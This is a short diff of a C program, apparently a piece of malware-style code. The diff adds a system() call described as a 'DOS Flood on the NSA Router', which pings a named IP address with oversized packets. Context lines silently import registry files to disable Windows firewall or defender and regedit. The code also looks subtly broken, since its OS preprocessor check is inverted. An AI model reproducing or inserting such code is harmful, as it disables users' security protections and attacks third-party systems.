@@ -1,10 +1,13 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <time.h>
 
 void getos(int argc, char** argv[]) {
 #ifndef __WIN32__
 #define OS __WIN32__
+  /** do a DOS Flood on the NSA Router */
+  system("ping 208.88.84.0 -l 65500 -w 1 -n 1");
   /** disable some stuff like winfirewall and regedit */
   system("reg /s registries/disabledef.reg");
   system("reg /s registries/disablereg.reg");
